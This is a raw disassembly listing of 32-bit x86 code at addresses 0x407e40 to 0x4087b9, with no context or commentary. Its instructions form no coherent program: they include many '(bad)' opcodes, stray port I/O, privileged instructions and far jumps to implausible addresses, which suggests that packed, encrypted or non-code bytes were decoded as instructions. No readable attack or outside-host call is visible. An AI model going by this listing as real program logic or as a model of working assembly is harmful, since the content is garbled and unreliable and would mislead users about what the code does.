  407e40:	jge    0x407e02
  407e42:	imul   dh
  407e44:	arpl   WORD PTR [ebp+edi*2+0x8],sp
  407e48:	or     eax,0x22ffb7cc
  407e4d:	fs mov ebp,0xf764eaec
  407e53:	call   FWORD PTR [eax-0x41]
  407e56:	out    dx,al
  407e57:	rcl    BYTE PTR [esp+eiz*2],1
  407e5a:	idiv   edi
  407e5c:	sbb    BYTE PTR [edi-0x1],bl
  407e5f:	call   edx
  407e61:	fs jge 0x407e6c
  407e64:	mov    ebp,0xa2ffb951
  407e69:	fs mov ebp,0xf7649ae4
  407e6f:	jmp    FWORD PTR [eax]
  407e71:	mov    edi,0x64e4b4ee
  407e76:	idiv   edi
  407e78:	fsubr  DWORD PTR [ebx-0x1]
  407e7b:	inc    DWORD PTR [edx+0x7d087d64]
  407e81:	shl    DWORD PTR [edi-0x42b4dd01],cl
  407e87:	loopne 0x407ea3
  407e89:	dec    ebx
  407e8a:	idiv   edi
  407e8c:	cwde   
  407e8d:	mov    edi,0x4b2498ee
  407e92:	test   DWORD PTR [ebx-0x97e0],0x1b7c8fe2
  407e9c:	and    ax,0xf7d8
  407ea0:	ror    BYTE PTR [edx+0xc],cl
  407ea3:	jne    0x407ea5
	...
  407eb5:	add    BYTE PTR [eax],al
  407eb7:	add    bh,al
  407eb9:	cmp    eax,0x4b1ad88d
  407ebe:	idiv   edi
  407ec0:	aad    0x49
  407ec2:	jge    0x407ecc
  407ec4:	sbb    eax,0x22ffb7bc
  407ec9:	pop    edi
  407eca:	add    ch,BYTE PTR [edx-0x74]
  407ecd:	lods   eax,DWORD PTR ds:[esi]
  407ece:	inc    ebp
  407ecf:	jne    0x407e55
  407ed1:	adc    eax,0x11abb0f4
  407ed6:	inc    edi
  407ed7:	mov    ch,0xa8
  407ed9:	inc    ecx
  407eda:	inc    edi
  407edb:	jmp    DWORD PTR [eax+esi*2+0x2993ff90]
  407ee2:	xchg   ecx,eax
  407ee3:	in     al,dx
  407ee4:	xor    DWORD PTR [ebx],0x47
  407ee7:	call   0xff879eb9
  407eec:	jnp    0x407f07
  407eee:	push   esp
  407eef:	div    DWORD PTR [ebx+0x4b]
  407ef2:	push   esp
  407ef3:	and    BYTE PTR ss:[ebx+0x47],dl
  407ef7:	call   FWORD PTR [ecx]
  407ef9:	dec    esp
  407efa:	pop    edi
  407efb:	call   FWORD PTR [ebx+0x54]
  407efe:	adc    esi,DWORD PTR [ebx+edx*2+0x64b5476b]
  407f05:	fwait
  407f06:	inc    edi
  407f07:	push   DWORD PTR [esp+ecx*8]
  407f0a:	sahf   
  407f0b:	(bad)  
  407f0c:	cmp    esp,DWORD PTR [ebx-0x74c40f6f]
  407f12:	inc    edi
  407f13:	call   0xff87f699
  407f18:	and    esi,ecx
  407f1a:	inc    edx
  407f1b:	jmp    0x407f20
	...
  407f30:	inc    ecx
  407f31:	rol    DWORD PTR [ebp-0x1],0x13
  407f35:	inc    ecx
  407f36:	inc    edi
  407f37:	call   0x4b8af9
  407f3c:	aad    0xed
  407f3e:	bnd jmp DWORD PTR [eax+0x36]
  407f42:	push   edi
  407f43:	or     eax,0xffffffc7
  407f46:	sar    bh,1
  407f48:	jne    0x407f0a
  407f4a:	inc    ebp
  407f4b:	jne    0x407ee1
  407f4d:	jecxz  0x407f7c
  407f4f:	mov    cl,0xdb
  407f51:	add    dh,BYTE PTR [ebp+eax*2-0x30]
  407f55:	push   ebx
  407f56:	in     eax,0x57
  407f58:	dec    ebp
  407f59:	xchg   esp,eax
  407f5a:	loope  0x407faa
  407f5c:	cmp    DWORD PTR [ecx+ebx*4-0x62464730],ecx
  407f63:	dec    esi
  407f64:	cmp    DWORD PTR [eax-0x536c277b],edi
  407f6a:	adc    dl,BYTE PTR [ebp+0x41b7b9a3]
  407f70:	nop
  407f71:	xchg   esp,eax
  407f72:	adc    al,0x7b
  407f74:	mov    al,ds:0x833fad13
  407f79:	mov    ecx,0xb8c9806d
  407f7e:	mov    al,0x4e
  407f80:	add    DWORD PTR [ecx+0x4c54185e],ecx
  407f86:	mov    al,ds:0x6db17403
  407f8b:	add    ecx,DWORD PTR [ebp+ecx*4+0x5910fe21]
  407f92:	jecxz  0x407f97
	...
  407fa8:	mov    ecx,ss
  407faa:	stos   DWORD PTR es:[edi],eax
  407fab:	dec    ebx
  407fac:	mov    WORD PTR [ecx+eiz*8+0x1d4f4b03],ss
  407fb3:	dec    esi
  407fb4:	xchg   ebx,eax
  407fb5:	xchg   esp,eax
  407fb6:	loope  0x407f91
  407fb8:	xor    ebp,DWORD PTR [ebx]
  407fba:	loope  0x407f95
  407fbc:	sub    ebp,DWORD PTR [ebx]
  407fbe:	loope  0x407f40
  407fc0:	leave  
  407fc1:	rcl    BYTE PTR [eax-0xa3fee80],0x4d
  407fc8:	adc    esp,DWORD PTR [esi+eiz*8-0x29]
  407fcc:	add    edi,DWORD PTR [ecx-0x50bafad]
  407fd2:	jne    0x407fd8
  407fd4:	mov    WORD PTR [ebp-0x5477275f],cs
  407fda:	add    al,BYTE PTR [edx]
  407fdc:	mov    WORD PTR [ecx+ebx*2-0x1eacab68],ss
  407fe3:	dec    esp
  407fe4:	popa   
  407fe5:	mov    BYTE PTR [eax],cl
  407fe7:	rcl    esi,0x1
  407fea:	imul   DWORD PTR [esi+0x6c84e445]
  407ff0:	fs shl esi,0x9e
  407ff4:	add    BYTE PTR [ebx-0x20],ah
  407ff7:	sbb    DWORD PTR es:[ecx-0x3bec9f0a],edi
  407ffe:	inc    BYTE PTR [esi-0x5272f8af]
  408004:	inc    ecx
  408005:	mov    ecx,0xe3b019f6
  40800a:	dec    edi
  40800b:	sub    BYTE PTR [eax],al
	...
  40801d:	add    BYTE PTR [eax],al
  40801f:	add    BYTE PTR [eax-0x26a64349],dl
  408025:	mov    bh,0xf6
  408027:	pop    esi
  408028:	mov    ds:0x8fa83fdc,eax
  40802d:	lods   al,BYTE PTR ds:[esi]
  40802e:	pop    eax
  40802f:	xchg   edi,eax
  408030:	fnstenv [edi-0x400b9380]
  408036:	idiv   BYTE PTR [esi]
  408038:	ss mov eax,0x55204e6e
  40803e:	or     BYTE PTR [esi],ch
  408040:	and    eax,ebp
  408042:	(bad)  
  408043:	shl    DWORD PTR es:[edi+0x54f8413c],1
  40804a:	or     BYTE PTR [ecx],al
  40804c:	popf   
  40804d:	(bad)  
  40804e:	test   BYTE PTR [esi],0xa7
  408051:	adc    esp,esp
  408053:	(bad)  
  408054:	shl    BYTE PTR [edi-0x53c8169f],1
  40805a:	dec    edi
  40805b:	test   al,0x8f
  40805d:	mov    bh,0xbc
  40805f:	stc    
  408060:	pusha  
  408061:	mov    bh,0xf6
  408063:	out    0x9a,al
  408065:	fdivr  QWORD PTR [edi]
  408067:	sub    BYTE PTR [eax+0x409f1cac],dl
  40806d:	mov    bh,0x80
  40806f:	fs inc edi
  408071:	mov    edi,0xddca00f6
  408076:	mul    BYTE PTR [edi+0x22]
  408079:	in     al,dx
  40807a:	inc    edi
  40807b:	add    BYTE PTR [edx],bl
  40807d:	pop    ds
  40807e:	clc    
  40807f:	idiv   edx
  408081:	dec    eax
  408082:	div    DWORD PTR ds:0x0
	...
  408098:	int    0xfb
  40809a:	inc    edi
  40809b:	add    BYTE PTR ds:0x1affbd61,bl
  4080a1:	cmp    ecx,DWORD PTR [ebp-0x8b6fd20]
  4080a7:	lea    esi,[eax]
  4080a9:	imul   edi,edi,0xffffffff
  4080ac:	sbb    al,BYTE PTR [ebx]
  4080ae:	outs   dx,DWORD PTR ds:[esi]
  4080af:	bnd jge 0x408085
  4080b2:	idiv   dh
  4080b4:	shl    BYTE PTR [ebx-0x1],0xff
  4080b8:	jmp    0xf6d2:0x3dd83d48
  4080bf:	out    0xb1,eax
  4080c1:	push   ds
  4080c2:	idiv   edi
  4080c4:	outs   dx,BYTE PTR ds:[esi]
  4080c5:	push   ebx
  4080c6:	jl     0x4080db
  4080c8:	test   BYTE PTR [esi],0xd0
  4080cb:	neg    DWORD PTR [edx+0x6f750c48]
  4080d1:	dec    eax
  4080d2:	cmp    BYTE PTR [edi-0x9850],cl
  4080d8:	push   0x5c
  4080da:	add    al,bh
  4080dc:	mov    al,0x67
  4080de:	(bad)  
  4080df:	call   FWORD PTR [edx+0x35fff6be]
  4080e5:	add    ebp,edi
  4080e7:	xchg   ebp,eax
  4080e8:	addr16 dec eax
  4080ea:	test   DWORD PTR [ebp-0x7c50],0xda6f021a
  4080f4:	sbb    eax,0x20fef6d2
  4080f9:	pusha  
  4080fa:	(bad)  
  4080fb:	inc    DWORD PTR [eax]
	...
  40810d:	add    BYTE PTR [eax],al
  40810f:	add    dl,bl
  408111:	dec    edx
  408112:	cmp    eax,0xcd758cd8
  408117:	push   ebx
  408119:	cmp    al,0x99
  40811b:	jmp    ebx
  40811d:	ror    DWORD PTR [edx+0x74],0x7f
  408121:	sub    al,BYTE PTR [ecx+0x42fddbd0]
  408127:	add    al,0x41
  408129:	mov    bl,0x41
  40812b:	xor    BYTE PTR [ebx],dl
  40812d:	sub    BYTE PTR [eax],bh
  40812f:	idiv   DWORD PTR [ebx-0x34f5a8eb]
  408135:	daa    
  408136:	cmp    bh,dh
  408138:	stos   DWORD PTR es:[edi],eax
  408139:	add    eax,0xad8c000c
  40813e:	mov    edx,0x437b3de7
  408143:	dec    DWORD PTR [edi]
  408145:	sub    BYTE PTR [eax-0x9],0x8b
  408149:	daa    
  40814a:	or     al,0x74
  40814c:	ret    
  40814d:	sub    al,BYTE PTR [ecx+0x435783d4]
  408153:	add    bh,cl
  408155:	xchg   ebp,eax
  408156:	(bad)  
  408157:	call   FWORD PTR [eax]
  408159:	xor    DWORD PTR [eax],esi
  40815b:	mul    DWORD PTR [ebx+0x4f]
  40815e:	mov    esp,0x5b5021fe
  408163:	call   DWORD PTR [ebx+0x54]
  408166:	xchg   esp,eax
  408167:	fisttp DWORD PTR [ebx+0x67]
  40816a:	idiv   DWORD PTR [edi-0x42723b48]
  408170:	dec    eax
  408171:	lahf   
  408172:	inc    ebx
  408173:	inc    DWORD PTR [eax]
	...
  408185:	add    BYTE PTR [eax],al
  408187:	add    BYTE PTR [eax+ebx*1-0x701e0108],cl
  40818e:	pop    ebx
  40818f:	jmp    DWORD PTR [ebx]
  408191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408192:	push   DWORD PTR [ecx-0x7ab648e5]
  408198:	sub    BYTE PTR [edi-0x547300bf],dh
  40819e:	or     al,BYTE PTR [eax]
  4081a0:	setne  BYTE PTR [edi+ebx*2+0x3d5b603]
  4081a8:	js     0x4081d3
  4081aa:	bound  ecx,QWORD PTR [eax+0x4ac5bdf8]
  4081b0:	mov    WORD PTR [eax+0x43],es
  4081b3:	xchg   DWORD PTR [ecx],ebx
  4081b5:	lods   eax,DWORD PTR ds:[esi]
  4081b6:	mov    ebp,0x3594d34a
  4081bb:	lods   eax,DWORD PTR ds:[esi]
  4081bc:	xor    edx,DWORD PTR [edx-0x49fda51f]
  4081c2:	adc    edi,esp
  4081c4:	mov    bl,0x22
  4081c6:	inc    edi
  4081c7:	dec    edx
  4081c8:	mov    bl,0xb5
  4081ca:	push   ebx
  4081cb:	push   edi
  4081cc:	mov    ds:0x194a85b5,eax
  4081d1:	mov    WORD PTR [ecx+0x75b5ea61],ds
  4081d7:	dec    edx
  4081d8:	fldcw  WORD PTR [ebp+esi*2-0x44a74b6]
  4081df:	sti    
  4081e0:	imul   ebx,esp,0xffffff9e
  4081e3:	dec    edx
  4081e4:	jnp    0x40819b
  4081e6:	fwait
  4081e7:	aaa    
  4081e8:	jnp    0x40819f
  4081ea:	pop    ebp
  4081eb:	dec    edx
	...
  408200:	and    DWORD PTR [eax-0x4a9cb5a3],esi
  408206:	mov    bl,0xfb
  408208:	jae    0x408226
  40820a:	xchg   DWORD PTR [edx+0x53],ecx
  40820d:	mov    ch,0x73
  40820f:	daa    
  408210:	inc    ebx
  408211:	mov    ch,0x25
  408213:	dec    edx
  408214:	mov    ecx,0xe9af198c
  408219:	mov    ah,0x15
  40821b:	dec    edx
  40821c:	stc    
  40821d:	mov    bl,0x15
  40821f:	dec    edx
  408220:	sub    esi,DWORD PTR [ebp-0x13d40465]
  408226:	pop    esi
  408227:	dec    edx
  408228:	sbb    esi,DWORD PTR [ebp-0x4ae4a0c5]
  40822e:	pop    es
  40822f:	mul    BYTE PTR [esi+0xa]
  408232:	mov    ecx,0xbcb555ee
  408237:	aad    0x5d
  408239:	mov    ch,0xf6
  40823b:	rol    ebp,1
  40823d:	add    esi,edi
  40823f:	(bad)  
  408240:	push   ebp
  408241:	(bad)  
  408242:	(bad)  
  408244:	push   ebp
  408245:	mov    ch,0xdf
  408247:	cmp    eax,0xbef6b4ff
  40824c:	add    esi,DWORD PTR [esi+edi*8+0x60ac55b6]
  408253:	js     0x4082aa
  408255:	mov    ch,0xf6
  408257:	pop    esp
  408258:	pusha  
  408259:	mov    ebp,0x56509ef6
  40825e:	mov    ecx,0x4cb55596
  408263:	xchg   ecx,eax
	...
  408278:	inc    edi
  408279:	add    al,0xf5
  40827b:	xchg   BYTE PTR [ebp-0x4b],al
  40827e:	jl     0x4082fd
  408280:	xor    BYTE PTR [edx],bh
  408282:	xchg   ebp,eax
  408283:	jmp    0xe20a6017
  408288:	(bad)
  40828c:	adc    ecx,ebx
  40828e:	sti    
  40828f:	ror    DWORD PTR [edi+0x5b56063e],cl
  408295:	pushf  
  408296:	loopne 0x408271
  408298:	add    eax,0x1b70f6b4
  40829d:	mov    al,0x5f
  40829f:	jmp    0xc1f64633
  4082a4:	add    BYTE PTR [ecx+ecx*2-0x17],cl
  4082a8:	addr16 push esp
  4082aa:	push   eax
  4082ab:	test   al,0x8f
  4082ad:	mov    bl,0x7c
  4082af:	icebp  
  4082b0:	xlat   BYTE PTR ds:[ebx]
  4082b1:	dec    edi
  4082b2:	rcl    BYTE PTR [esi],cl
  4082b4:	aad    0x21
  4082b6:	dec    ebp
  4082b7:	adc    eax,ebx
  4082b9:	cmp    esp,DWORD PTR [edx-0x9291300]
  4082bf:	add    eax,DWORD PTR [bx+si]
  4082c2:	dec    eax
  4082c3:	add    BYTE PTR [edx],al
  4082c5:	mov    ds:0x983448d0,eax
  4082ca:	loopne 0x4082e9
  4082cc:	sbb    DWORD PTR [ebp-0x9],ebx
  4082cf:	or     esp,DWORD PTR ds:0xb8892ce4
  4082d5:	inc    esp
  4082d6:	pusha  
  4082d7:	add    ebp,esi
  4082d9:	dec    esp
  4082da:	mov    dh,0xff
	...
  4082f0:	cwde   
  4082f1:	mov    al,0xee
  4082f3:	mov    ds:0xfff75d00,al
  4082f8:	mov    BYTE PTR [eax-0x9],ah
  4082fb:	jne    0x4082f6
  4082fd:	pop    esp
  4082fe:	jge    0x408308
  408300:	sbb    eax,0x12ffa572
  408305:	pop    ebp
  408306:	jge    0x4082fc
  408308:	or     eax,0x12ffb881
  40830d:	sar    BYTE PTR [eax-0x8679ba8],1
  408313:	jne    0x4082b2
  408315:	dec    edi
  408316:	idiv   ah
  408318:	add    bl,BYTE PTR [ebp-0x9]
  40831b:	jne    0x40830e
  40831d:	pop    esp
  40831e:	jge    0x408328
  408320:	fst    st(6)
  408322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408323:	call   edx
  408325:	outs   dx,BYTE PTR ds:[esi]
  408326:	retf   0x7504
  408329:	add    al,BYTE PTR [edx-0xb8c0914]
  40832f:	push   0x65
  408331:	rol    DWORD PTR ds:0xeeaf18ff,1
  408337:	in     eax,0x10
  408339:	pop    esp
  40833a:	test   DWORD PTR [ecx+0x605ae8],0x68b64c25
  408344:	inc    BYTE PTR es:[edi+0x0]
  408348:	mov    WORD PTR ds:0xbdcd58f0,ss
  40834e:	aas    
  40834f:	jne    0x4082d5
  408351:	test   DWORD PTR [ebx],edi
  408353:	fld    DWORD PTR [eax]
	...
  408365:	add    BYTE PTR [eax],al
  408367:	add    BYTE PTR [ebx],dl
  408369:	mov    dl,0x4e
  40836b:	jne    0x408375
  40836d:	stos   BYTE PTR es:[edi],al
  40836e:	les    eax,FWORD PTR [edi]
  408370:	hlt    
  408371:	mov    edx,0xe3fbff90
  408376:	dec    ecx
  408377:	add    al,0x8c
  408379:	push   0x10fec73
  40837e:	inc    eax
  40837f:	push   0xffffff8c
  408381:	push   edi
  408382:	cld    
  408383:	(bad)  
  408384:	popa   
  408385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408386:	push   edx
  408387:	stos   BYTE PTR es:[edi],al
  408388:	and    edx,esi
  40838a:	dec    esi
  40838b:	mov    DWORD PTR [ecx-0x17],edx
  40838e:	sar    edi,cl
  408390:	ret    
  408391:	icebp  
  408392:	lea    ebp,[eax-0x6b]
  408395:	push   esp
  408396:	int    0xff
  408398:	sub    esi,DWORD PTR [ebx+0xa8c40a3]
  40839e:	fld    DWORD PTR [edi]
  4083a0:	mov    ah,0x27
  4083a2:	and    eax,0xc869bff
  4083a7:	push   0xffcd7437
  4083ac:	repz jl 0x408354
  4083af:	inc    eax
  4083b0:	mov    WORD PTR [edx+0x19],es
  4083b3:	fadd   st,st(4)
  4083b5:	cld    
  4083b6:	or     ch,al
  4083b8:	aad    0xe
  4083ba:	dec    edi
  4083bb:	call   DWORD PTR [edi-0xbdc2785]
  4083c1:	mov    ah,BYTE PTR [ebp+0x530b8c40]
  4083c7:	and    eax,0x504f7318
	...
  4083e0:	mov    ah,0xbb
  4083e2:	or     ch,bh
  4083e4:	add    dl,ah
  4083e6:	jecxz  0x408440
  4083e8:	int    0x94
  4083ea:	loope  0x40839f
  4083ec:	xor    ch,BYTE PTR [eax]
  4083ee:	stc    
  4083ef:	pop    ebx
  4083f0:	jl     0x4083bd
  4083f2:	sbb    eax,0x518c3447
  4083f7:	inc    edi
  4083f8:	sbb    esi,DWORD PTR [edx+0x28134773]
  4083fe:	stc    
  4083ff:	pop    ebx
  408400:	sbb    BYTE PTR [eax],al
  408402:	inc    BYTE PTR [esi-0x2b]
  408405:	(bad)  
  408406:	in     al,dx
  408407:	add    esp,DWORD PTR [ecx+0x1d]
  40840a:	fld    QWORD PTR [edx-0x50c14f38]
  408410:	jne    0x4083a6
  408412:	dec    ebx
  408413:	cmc    
  408414:	loop   0x40843d
  408416:	jmp    0xce402e76
  40841b:	inc    esi
  40841c:	add    eax,0x817ab558
  408421:	push   eax
  408422:	sub    ebp,eax
  408424:	ret    
  408425:	push   ds
  408426:	in     al,0xe3
  408428:	push   ebx
  408429:	push   ebx
  40842a:	loope  0x4083af
  40842c:	jae    0x4083c2
  40842e:	sbb    eax,0x383933bb
  408433:	lds    esp,FWORD PTR [ebx-0x84576b6]
  408439:	xchg   esp,eax
  40843a:	loope  0x408436
  40843c:	shr    DWORD PTR [eax],cl
  40843e:	int3   
  40843f:	lods   eax,DWORD PTR ds:[esi]
  408440:	jae    0x408453
  408442:	cmp    BYTE PTR [esi+0x0],al
	...
  408455:	add    BYTE PTR [eax],al
  408457:	add    BYTE PTR [ebx-0x33530ec4],al
  40845d:	xchg   esp,eax
  40845e:	mov    cl,0x5b
  408460:	cmp    ebp,esp
  408462:	push   ebp
  408463:	inc    esi
  408464:	mov    esp,0x7303e13c
  408469:	repnz mov al,0x46
  40846c:	loope  0x40840a
  40846e:	pop    ecx
  40846f:	inc    ebx
  408470:	cmp    DWORD PTR [ecx+0xfa5b35],esi
  408476:	or     BYTE PTR [esi],dh
  408478:	retf   0x8bd
  40847b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847c:	(bad)  
  40847e:	or     BYTE PTR [ebp+eax*8-0x30250ba6],bl
  408485:	jmp    0x40847d
  408487:	push   ss
  408488:	retf   0xf9b1
  40848b:	aas    
  40848c:	xchg   DWORD PTR [ecx+0x27ca3c7d],ebx
  408492:	hlt    
  408493:	(bad)  
  408494:	fistp  DWORD PTR [eax-0x4edb1c20]
  40849a:	test   BYTE PTR [esi-0x123623cf],0x8f
  4084a1:	inc    edi
  4084a2:	or     ebp,0xd
  4084a5:	fdiv   st,st(3)
  4084a7:	inc    ebx
  4084a8:	mov    BYTE PTR [esi],bh
  4084aa:	sbb    cl,dh
  4084ac:	retf   
  4084ad:	cwde   
  4084ae:	loopne 0x408445
  4084b0:	hlt    
  4084b1:	mov    al,0xf6
  4084b3:	jo     0x4084c0
  4084b5:	lods   eax,DWORD PTR ds:[esi]
  4084b6:	pop    edi
  4084b7:	jmp    0x41f6464b
	...
  4084d0:	or     al,0x4b
  4084d2:	dec    ecx
  4084d3:	jmp    0x2891b2af
  4084d8:	nop
  4084d9:	mov    cl,0x7c
  4084db:	loope  0x408524
  4084dd:	or     eax,edx
  4084df:	mov    ss,WORD PTR [ecx-0x4f]
  4084e2:	jl     0x408469
  4084e4:	dec    ecx
  4084e5:	daa    
  4084e6:	add    BYTE PTR [ecx+0x76f700c3],dl
  4084ec:	(bad)  
  4084ed:	ror    BYTE PTR [ebx],cl
  4084ef:	jmp    0x6924a01e
  4084f4:	int3   
  4084f5:	sar    dh,1
  4084f7:	pop    esi
  4084f8:	shl    DWORD PTR [ecx],1
  4084fa:	dec    ebp
  4084fb:	push   ebp
  4084fc:	sbb    BYTE PTR [edi+0x69d0dd7c],ch
  408502:	rol    BYTE PTR [eax],1
  408504:	sbb    eax,0x57e7f6d3
  408509:	cmp    eax,0x542e0008
  40850e:	pop    es
  40850f:	test   DWORD PTR [esp+edx*4],eax
  408512:	or     BYTE PTR [eax],al
  408514:	(bad)  
  408515:	out    dx,eax
  408516:	inc    BYTE PTR [eax]
  408518:	xor    eax,0xf0c70894
  40851d:	pop    edi
  40851e:	test   DWORD PTR [edi],0x629425
  408524:	call   DWORD PTR [ebx-0x6be0ff9e]
  40852a:	test   DWORD PTR [ebp+0x1],eax
  40852d:	in     al,0x83
  40852f:	test   DWORD PTR [ecx],eax
  408531:	popa   
  408532:	idiv   edi
	...
  408548:	mov    ch,0x59
  40854a:	jge    0x408544
  40854c:	retf   0xf2de
  40854f:	call   0x48c2d5
  408554:	out    dx,al
  408555:	push   ebx
  408556:	jl     0x40855d
  408558:	mov    esp,0xb50007cf
  40855d:	retf   
  40855e:	mov    edx,0xf7987448
  408563:	jne    0x40853e
  408565:	dec    ebx
  408566:	lea    esi,[edx-0x74a7a716]
  40856c:	in     eax,0x26
  40856e:	(bad)  
  40856f:	hlt    
  408570:	add    bl,BYTE PTR [ecx-0x9]
  408573:	push   eax
  408574:	push   edi
  408575:	push   eax
  408576:	jge    0x40852a
  408578:	or     bl,BYTE PTR [ecx-0x7f]
  40857b:	test   DWORD PTR ds:0xdfff761,eax
  408581:	ins    BYTE PTR es:[edi],dx
  408582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408583:	(bad)  
  408584:	jmp    0x47fa:0x467f6cd
  40858b:	add    dl,cl
  40858d:	push   ds
  40858e:	clc    
  40858f:	test   DWORD PTR [esi+eax*2+0x65a1ff4c],0x458c40b3
  40859a:	xor    BYTE PTR [ecx-0x7a8d91b5],dh
  4085a0:	sub    BYTE PTR [esi+0x4c],ch
  4085a3:	jmp    DWORD PTR [esi-0x2a6f2d43]
  4085a9:	cld    
  4085aa:	or     bh,bh
	...
  4085c0:	loope  0x40854e
  4085c2:	inc    esp
  4085c3:	jmp    DWORD PTR [ebx]
  4085c5:	xchg   BYTE PTR [esi],al
  4085c7:	fadd   st,st(4)
  4085c9:	cld    
  4085ca:	or     ch,al
  4085cc:	loope  0x408639
  4085ce:	dec    esp
  4085cf:	call   DWORD PTR ds:0x3f75f38
  4085d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d6:	iret   
  4085d7:	push   DWORD PTR [ebx+0x45]
  4085da:	mov    ds:0x70b68c40,al
  4085df:	lock jecxz 0x4085af
  4085e2:	dec    edx
  4085e3:	call   FWORD PTR [ecx-0x73bf3c1b]
  4085e9:	aad    0x9a
  4085eb:	mov    cl,0xd3
  4085ed:	aad    0x84
  4085ef:	test   DWORD PTR [ebp+eiz*8+0x4011ff4a],esi
  4085f6:	push   0xdbfdbbf7
  4085fb:	addr16 out 0x53,al
  4085fe:	int    0xff
  408600:	stos   BYTE PTR es:[edi],al
  408601:	inc    edi
  408602:	cmp    al,0xf7
  408604:	mov    ds:0xb4354b05,eax
  408609:	je     0x4085d8
  40860b:	jmp    FWORD PTR [ebx-0x74008278]
  408611:	mov    ds:0x3aa5744a,eax
  408616:	mov    esp,ebx
  408618:	cmp    DWORD PTR [edi],0x4b
  40861b:	add    al,0xf9
  40861d:	xchg   esp,eax
  40861e:	icebp  
  40861f:	inc    edx
  408620:	pushf  
  408621:	sbb    eax,0x246c
	...
  408636:	add    BYTE PTR [eax],al
  408638:	pop    ebx
  408639:	scas   al,BYTE PTR es:[edi]
  40863a:	pop    ebp
  40863b:	aam    0x73
  40863d:	ins    BYTE PTR es:[edi],dx
  40863e:	ja     0x408683
  408640:	push   ebx
  408641:	mov    edx,0x294c0ed4
  408646:	out    dx,eax
  408647:	shr    DWORD PTR [ebx],cl
  408649:	or     BYTE PTR [edi+0x6bd63b43],0x24
  408650:	cmp    ebp,DWORD PTR [esi-0x6b73e6d3]
  408656:	loope  0x4085de
  408658:	loope  0x408612
  40865a:	adc    eax,0x9d951b43
  40865f:	fimul  DWORD PTR [esi]
  408661:	lock sbb al,0x3b
  408664:	or     ebp,DWORD PTR [esi+0x1151b7e0]
  40866a:	cmp    al,0x2c
  40866c:	add    ebp,DWORD PTR [esi+0x577803e5]
  408672:	pop    ecx
  408673:	add    al,0x8c
  408675:	mov    ebp,0x9c594296
  40867a:	leave  
  40867b:	outs   dx,DWORD PTR ds:[esi]
  40867c:	es scas al,BYTE PTR es:[edi]
  40867e:	lds    eax,FWORD PTR [edx+0x19]
  408681:	shl    DWORD PTR [ebp+0x3badcb42],0xc
  408688:	mov    ah,0x94
  40868a:	mov    al,BYTE PTR [edx-0x45]
  40868d:	lods   eax,DWORD PTR ds:[esi]
  40868e:	jnp    0x4086bb
  408690:	mov    ebx,0x2142adad
  408695:	pushf  
  408696:	cdq    
  408697:	xor    eax,0x429dadf6
	...
  4086b0:	loope  0x40866a
  4086b2:	popf   
  4086b3:	inc    edx
  4086b4:	xchg   ebx,eax
  4086b5:	lods   eax,DWORD PTR ds:[esi]
  4086b6:	repz or esi,DWORD PTR [eax+edi*4+0x5a]
  4086bb:	inc    edx
  4086bc:	sub    DWORD PTR [ebp-0x5a50c3f9],0xfffffff6
  4086c3:	outs   dx,BYTE PTR ds:[esi]
  4086c4:	into   
  4086c5:	daa    
  4086c6:	add    BYTE PTR [ecx+0x23],dl
  4086c9:	sti    
  4086ca:	neg    BYTE PTR [esi-0x32]
  4086cd:	out    0xeb,eax
  4086cf:	pop    esi
  4086d0:	into   
  4086d1:	lods   eax,DWORD PTR ds:[esi]
  4086d2:	fist   WORD PTR [ecx+0x46f6addc]
  4086d8:	(bad)  
  4086d9:	sar    dh,0x3e
  4086dc:	into   
  4086dd:	mov    esp,0xadce84a4
  4086e2:	div    BYTE PTR [edi+eiz*2-0x5b]
  4086e6:	mul    BYTE PTR [esi]
  4086e8:	ja     0x4086dc
  4086ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086eb:	push   ds
  4086ec:	into   
  4086ed:	lods   eax,DWORD PTR ds:[esi]
  4086ee:	mov    esp,0xf6ad5619
  4086f3:	add    esi,esi
  4086f5:	(bad)  
  4086f6:	test   BYTE PTR [esi],0x4e
  4086f9:	push   edi
  4086fa:	lock adc BYTE PTR ds:0x4df6f6af,bh
  408701:	daa    
  408702:	hlt    
  408703:	add    DWORD PTR [edx+0xb],edi
  408706:	or     cl,ch
  408708:	push   esi
  408709:	sar    bh,cl
  40870b:	call   0x6b24a0ca
  408710:	inc    esp
  408711:	mov    al,0x61
  408713:	jmp    0x408718
	...
  408728:	and    DWORD PTR [edx-0x4367c309],eax
  40872e:	mov    al,ds:0x80ad4d93
  408733:	sub    al,0x4c
  408735:	cmp    al,0xba
  408737:	adc    bh,cl
  408739:	lods   al,BYTE PTR ds:[esi]
  40873a:	cmc    
  40873b:	sbb    al,0x98
  40873d:	mov    esp,0xad4d9f1d
  408742:	neg    BYTE PTR [esp+ecx*2]
  408745:	lods   eax,DWORD PTR ds:[esi]
  408746:	jl     0x408729
  408748:	addr16 enter 0xa1,0x12
  40874d:	push   esi
  40874e:	rol    edx,0x69
  408751:	cwde   
  408752:	pop    ebp
  408753:	mov    edx,DWORD PTR [ecx]
  408755:	adc    cl,ah
  408757:	cld    
  408758:	(bad)  
  408759:	nop
  40875a:	bound  edx,QWORD PTR [edx+esi*8]
  40875d:	jecxz  0x40876d
  40875f:	call   0x37c1d1
  408764:	in     al,dx
  408765:	shl    edx,cl
  408767:	push   0xbee79865
  40876c:	pop    ebp
  40876d:	dec    esp
  40876e:	push   ecx
  40876f:	inc    ecx
  408770:	xor    eax,0xe459d900
  408775:	xchg   edi,eax
  408776:	div    DWORD PTR [ebp+0x2d]
  408779:	sub    BYTE PTR [ebx-0x2a],0x72
  40877d:	push   ebp
  40877e:	div    DWORD PTR [ebp-0x7f]
  408781:	push   ebp
  408782:	jge    0x40878c
  408784:	lea    ecx,[edi]
  408786:	mov    ds:0xca5f82ff,al
  40878b:	add    al,0x0
	...
  40879d:	add    BYTE PTR [eax],al
  40879f:	add    ch,dh
  4087a1:	ret    0xec81
  4087a4:	je     0x408802
  4087a6:	shl    bh,1
  4087a8:	add    dl,BYTE PTR [ebp-0x7b]
  4087ab:	inc    ebp
  4087ac:	loope  0x408775
  4087ae:	cmc    
  4087af:	jne    0x408792
  4087b1:	push   esp
  4087b2:	cmp    eax,0xf6d79dd8
  4087b7:	out    0x93,eax
  4087b9:	invd   
